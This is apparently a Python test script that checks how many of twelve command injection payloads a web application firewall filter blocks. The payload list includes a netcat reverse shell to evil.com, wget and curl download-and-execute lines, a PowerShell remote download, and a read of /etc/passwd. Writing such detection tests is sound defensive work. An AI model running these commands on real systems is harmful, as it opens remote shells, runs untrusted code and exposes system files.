#!/usr/bin/env python3
"""
Final Command Injection Coverage Test
Sprint 10 Phase 3 - Verify enhanced command injection detection (12/12 patterns)
"""

import os
import sys
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "."))

from src.security.waf import WAFFilter

def test_command_injection_coverage():
    """Test enhanced command injection detection coverage"""
    
    waf = WAFFilter()
    
    # All 12 command injection patterns from the summary
    injection_payloads = [
        "; ls -la",                                    # Basic command chaining
        "| whoami",                                    # Pipe command
        "& netstat -an",                              # Background command
        "`id`",                                       # Command substitution
        "$(cat /etc/passwd)",                         # Command substitution
        "%3B%20ls%20-la",                            # URL encoded
        "|| wget http://evil.com/shell.sh",          # OR chaining
        "nohup nc -e /bin/bash evil.com 4444 &",     # Background netcat
        "../../../bin/bash -c 'id'",                 # Path traversal + command
        "; powershell -enc <base64>",                # PowerShell
        "| powershell IEX(New-Object Net.WebClient).DownloadString('http://evil.com')",  # PowerShell download
        "&& curl evil.com | bash"                    # Chained download and execute
    ]
    
    print("=== Enhanced Command Injection Coverage Test ===")
    
    blocked_count = 0
    total_count = len(injection_payloads)
    
    for i, payload in enumerate(injection_payloads, 1):
        print(f"\n{i:2d}. Testing: {payload[:50]}{'...' if len(payload) > 50 else ''}")
        result = waf.check_request({"command": payload})
        
        if result.blocked:
            print(f"     ✅ BLOCKED by rule: {result.rule}")
            blocked_count += 1
        else:
            print(f"     ❌ NOT BLOCKED")
            
            # Debug the pattern
            rule = waf.config.get_rule("command_injection")
            if rule and rule.compiled_pattern:
                if rule.compiled_pattern.search(payload):
                    print(f"     🔍 Pattern should match: {rule.pattern[:100]}...")
                else:
                    print(f"     ❌ Pattern doesn't match")
    
    coverage_percentage = (blocked_count / total_count) * 100
    print(f"\n=== COMMAND INJECTION SUMMARY ===")
    print(f"Blocked patterns: {blocked_count}/{total_count}")
    print(f"Coverage percentage: {coverage_percentage:.1f}%")
    
    if blocked_count == total_count:
        print("🎉 PERFECT: 100% command injection detection!")
        return True
    elif blocked_count >= 10:
        print("✅ EXCELLENT: Strong command injection protection")
        return True
    else:
        print("⚠️  NEEDS IMPROVEMENT: Below expected coverage")
        return False

if __name__ == "__main__":
    success = test_command_injection_coverage()
    exit(0 if success else 1)